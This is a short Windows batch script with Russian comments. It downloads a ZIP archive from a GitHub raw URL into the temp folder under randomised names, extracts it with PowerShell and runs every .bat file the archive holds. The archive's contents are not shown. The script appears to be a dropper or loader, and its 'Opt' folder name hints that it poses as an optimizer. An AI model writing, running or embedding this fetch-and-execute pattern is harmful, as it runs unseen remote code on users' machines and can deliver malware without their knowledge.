@echo off
setlocal enabledelayedexpansion

rem --- Пути во временной папке ---
set "A1=%TEMP%\Opt_%RANDOM%"
set "A2=%TEMP%\_%RANDOM%.zip"

rem --- URL ZIP-файла на GitHub ---
set "U1=https://raw.githubusercontent.com/spitak2/my-zip-files/main/zip-files.zip"

rem --- Очистка старых временных файлов ---
if exist "%A1%" rmdir /s /q "%A1%"
if exist "%A2%" del /f /q "%A2%"

rem --- Скачивание ZIP ---
powershell -Command "Invoke-WebRequest -Uri '%U1%' -OutFile '%A2%'"

rem --- Создаем папку для распаковки ---
mkdir "%A1%"

rem --- Распаковываем ZIP без пароля через PowerShell ---
powershell -Command "Expand-Archive -Path '%A2%' -DestinationPath '%A1%' -Force"

rem --- Запуск BAT-файлов внутри распакованной папки ---
if exist "%A1%" (
    for %%f in ("%A1%\*.bat") do (
        call "%%f"
    )
)



exit

